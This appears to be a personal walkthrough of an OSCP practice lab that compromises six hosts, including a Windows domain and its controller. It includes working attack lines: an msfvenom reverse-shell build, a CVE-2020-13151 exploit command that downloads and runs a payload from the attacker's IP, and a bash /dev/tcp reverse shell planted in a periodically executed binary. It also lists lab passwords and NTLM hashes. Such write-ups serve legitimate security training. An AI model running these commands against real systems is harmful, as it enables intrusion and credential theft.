# OSCP A

## Network

**Given:**

- 192.168.188.141 MS01 (win)
- 192.168.188.143 aero
- 192.168.188.144 crystal
- 192.168.188.145 hermes

**Found:**

- 10.10.148.140 DC01
- 10.10.148.142 MS02

## Creds

```
eric.wallows:EricLikesRunning800 (given creds for 192.168.155.141)
web_svc:Diamond1 (kerberosted user)

other users:
tom.admin
sql_svc
```

## Network Enumeration

![](assets/Pasted%20image%2020250216161827.png)

## 192.168.188.141 / MS01

### Enumeration

![](assets/Pasted%20image%2020250213233214.png)

Testing the user we now that the domain is `oscp.exam` and the machine is `MS01`.

![](assets/Pasted%20image%2020250213233617.png)

### Initial Access

We can enter the machine via ssh.

```bash
ssh eric.wallows@192.168.201.141
```

Let's start enumerating permissions, subnets and users.

![](assets/Pasted%20image%2020250213234634.png)

![](assets/Pasted%20image%2020250213234708.png)

![](assets/Pasted%20image%2020250213234815.png)

We have an interface on 10.10.161.141 and seimpersonateprivilege. We also have all domain users.
Let's make a users txt.

We transfer adPEAS and winPEAS to the target

![](assets/Pasted%20image%2020250213235535.png)

Import module adPEAS and execute

![](assets/Pasted%20image%2020250213235644.png)

Found the DC on 10.10.161.140

![](assets/Pasted%20image%2020250214010101.png)

We got `tom_admin` that can DCsync to the domain and two kerberoastable users: `sql_svc` and `web_svc`.

![](assets/Pasted%20image%2020250213235738.png)

### Privilege Escalation

He has SeImpersonatePrivilege so we'll do a PrintSpoofer attack. Transfer the exploit and execute it.

![](assets/Pasted%20image%2020250214003902.png)

### Post Exploitation

Transfer mimikatz.exe to the machine and execute it as administrator.

```bash
sekurlsa::logonpasswords
```

![](assets/Pasted%20image%2020250214004215.png)

`celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd`
`mary.williams:9a3121977ee93af56ebd0ef4f527a35e`

We can use hashcat to try to crack some passwords.

Nothing, let's try another route, kerberoasting.

Transfer chisel.exe to the target and create a socks tunnel.

![](assets/Pasted%20image%2020250214010618.png)

![](assets/Pasted%20image%2020250214010638.png)

Now  perform kerberoasting attack with proxychains pointing to the DC.

![](assets/Pasted%20image%2020250214010713.png)

Using hashcat we got the password

![](assets/Pasted%20image%2020250214011025.png)

`web_svc:Diamond1`

Now do a ping sweep to find x.x.x.41 and x.x.x.42

![](assets/Pasted%20image%2020250214011743.png)

## 10.10.148.142 / MS02

### Enumeration

![](assets/Pasted%20image%2020250214015908.png)

### Initial Access

Using celia.almeda credentials we log in via winrm passing the hash.

![](assets/Pasted%20image%2020250216005214.png)

in C:\ we have windows.old so we take SAM and SYSTEM and download with evil-winrm, then with secretsdump local

![](assets/Pasted%20image%2020250216013235.png)

![](assets/Pasted%20image%2020250216013313.png)

PTH to the DC01

## 10.10.148.140 / DC01

![](assets/Pasted%20image%2020250214020053.png)

### Initial Access

Using the hash found in 142 we evil-winrm

![](assets/Pasted%20image%2020250216014017.png)

### PrivEsc

tom_admin can DCSync the DC so

![](assets/Pasted%20image%2020250216014815.png)

### Post Exploitation

Using the hash

![](assets/Pasted%20image%2020250216014958.png)

## 192.168.188.143 / AERO

### Enumeration

![](assets/Pasted%20image%2020250214163055.png)

The web server on port 80 is the default apache2 page with nothing more.
The one at 81 is the default nginx fedora one.

![](assets/Pasted%20image%2020250214163514.png)

The machine is called aero so i search for aero and the port 3000 and found aerospike, that is a nosql database.
The script in searchsploit is broken so searching the vuln online i got https://github.com/b4ny4n/CVE-2020-13151.

### Initial Access

The right script is the one in https://www.exploit-db.com/exploits/49067 with the lua in the github repo. We have to change the version in the script before executing it.

Once changed it, start a listener on 80 and a http server on 443 serving a reverse shell.

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=80 -f elf -o reverse
```

```bash
python cve2020-13151.py --ahost 192.168.155.143 --cmd 'wget http://192.168.45.229:443/reverse -O /tmp/reverse && chmod +x /tmp/reverse && /tmp/reverse &'
```

![](assets/Pasted%20image%2020250214232531.png)

![](assets/Pasted%20image%2020250214232556.png)

get the proof in aero's home

![](assets/Pasted%20image%2020250216160825.png)

### Privilege Escalation

Checking the suid programs, we find screen-4.5.0

![](assets/Pasted%20image%2020250214234518.png)

But i didn't get it to work so i transferred and launched pspy and got a file that was being executed periodically.

![](assets/Pasted%20image%2020250215005130.png)

/usr/bin/asinfo, i replaced the content with `bash -i >& /dev/tcp/192.168.45.229/443 0>&1`, started a listener and waited.

```bash
echo 'bash -i >& /dev/tcp/192.168.45.229/443 0>&1' >  /usr/bin/asinfo
```

### Post Exploitation

![](assets/Pasted%20image%2020250215005111.png)

## 192.168.188.144 / CRYSTAL

### Enumeration

![](assets/Pasted%20image%2020250216115157.png)

Using nikto we get a .git folder

![](assets/Pasted%20image%2020250216122047.png)

### Initial Access

With git-dumpener we can get all

![](assets/Pasted%20image%2020250216122116.png)

We got the project

![](assets/Pasted%20image%2020250216122136.png)

In configuration

![](assets/Pasted%20image%2020250216122157.png)

if we examine the logs we can get this database version in the past

![](assets/Pasted%20image%2020250216123440.png)

So `dean@challenge.pwk:BreakingBad92`

Another update give us another user

![](assets/Pasted%20image%2020250216124056.png)

`stuart@challenge:BreakingBad92`

Testing the ftp service we got the local flag

![](assets/Pasted%20image%2020250216124238.png)

Using the same user with ssh 

![](assets/Pasted%20image%2020250216125102.png)

### Privilege Escalation

We see in /opt/backups that there is a backup of the web, transfer to the attack host and zip2john, and using hashcat we have the password, `codeblue`.

![](assets/Pasted%20image%2020250216150523.png)

We then extract the zip with 7z x and we can see in config file 

![](assets/Pasted%20image%2020250216150613.png)

database credentials, but there is no database running.

So we try to pivot to chloe with the secret and.

### Post Exploitation

![](assets/Pasted%20image%2020250216155715.png)

Chloe is admin so pivot to root and we got the flag.

## 192.168.188.145 / HERMES

### Enumeration

![](assets/Pasted%20image%2020250216164216.png)

The web page has nothing but we can enumerate a user, samuel haynes, that could be s.haynes or samule.haynes.

![](assets/Pasted%20image%2020250216164438.png)

Scanning upd we have port 161

![](assets/Pasted%20image%2020250216171258.png)

Using snmpwalk first we get the users, then running apps and apps

![](assets/Pasted%20image%2020250216172059.png)

![](assets/Pasted%20image%2020250216172128.png)

### Initial Access

We see mouse server 1.7.8.5 so

![](assets/Pasted%20image%2020250216172218.png)

We create a msfvenom reverse shell, a python server to serv it and a nc listener on 80

```bash
python 50972.py 192.168.188.145 192.168.45.229:443 reverse.exe
```

![](assets/Pasted%20image%2020250216172747.png)

### Privilege Escalation

Get local flag

![](assets/Pasted%20image%2020250216185610.png)

Transfer winpeas and 

![](assets/Pasted%20image%2020250216194358.png)

RDP to the machine 

```bash
xfreerdp3 /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.188.145
```

The proof is on admin's desktop

![](assets/Pasted%20image%2020250216194657.png)